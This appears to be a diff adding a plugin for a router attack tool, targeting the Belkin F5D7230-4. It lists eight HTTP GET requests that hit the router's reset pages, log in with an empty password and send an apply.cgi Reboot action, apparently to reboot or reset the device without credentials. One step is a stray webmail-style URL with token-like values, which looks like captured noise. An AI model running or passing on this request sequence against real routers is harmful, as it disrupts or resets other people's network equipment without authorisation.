@@ -1,0 +1,32 @@
+"""
+F5D7230-4
+"""
+
+vendor = 'Belkin'
+name = 'F5D7230-4'
+regex = r'(?s).*(Belkin).*'
+
+# step #1
+get('http://{routerip}/util_reset.html?')
+
+# step #2
+get('http://{routerip}/login.cgi?page=login&logout=2&pws=')
+
+# step #3
+get('http://{routerip}/ut_reset.html?')
+
+# step #4
+get('http://{routerip}/?')
+
+# step #5
+get('http://{routerip}/mail/?ui=1&ik=2bd7375f34&view=tl&search=inbox&start=0&tlt=1197cfa463e&fp=b2415c803815fa0b&auto=1&vv=1&rq=xm&at=xn3j2wom50804w5tsxsksd9wzw8gxz&zx=mxzzw6ew0264')
+
+# step #6
+get('http://{routerip}/util_reset.html?')
+
+# step #7
+get('http://{routerip}/apply.cgi?webpage=util_reset.html&action=Reboot&page=system_reset&logout=2')
+
+# step #8
+get('http://{routerip}/reset_success.html?')
+
